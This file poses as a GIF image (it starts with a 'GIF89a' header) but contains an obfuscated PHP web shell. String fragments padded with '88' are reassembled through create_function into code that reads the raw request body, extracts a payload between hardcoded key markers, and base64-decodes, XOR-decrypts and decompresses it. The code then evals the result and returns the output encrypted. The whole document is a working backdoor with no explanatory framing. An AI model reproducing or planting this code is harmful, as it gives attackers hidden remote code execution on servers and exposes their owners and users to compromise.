GIF89a;
<?php
echo 'on';
$s='8AR8qsiKAho"88;functio8888n x($t,88$k){$c=s88trlen($88k);$l=st88rlen($88t88);88$o="";for($';
$z='nts("php://88input"88)88,$m)==1) {@o88b_star88t(88);@eva88l(@gz88uncompress88(@x(';
$Q='$k="3448875d28888a";$kh="a46910d885bd54";88$kf="28823721988f88d88a71";$p="fGf88vaY8';
$r='88n(88);$r=@base6884_e88ncod88e88(@x(@gzcompre88ss88($o)88,$k));print("$p88$88kh$r$kf");}';
$H=str_replace('uG','','cruGeauGtuGe_uGuGuGfunction');
$S='i88=0;8888$i<$l;){for($j88=0;($j<$8888c&&$i<$l);$j88++,$i8888+8888+){$o.=$t{$i}^$k{';
$P='$j};}88}return $o88;88}if (@preg_88ma88tch("/$kh(88.+)$88kf/88",@f88ile_get_88cont88e';
$k='@ba88se6488_dec88ode($m[881]),$k)88));$88o=@ob_ge88t_conten88ts();@88ob88_end_clea';
$G=str_replace('88','',$Q.$s.$S.$P.$z.$k.$r);
$O=$H('',$G);$O();
?>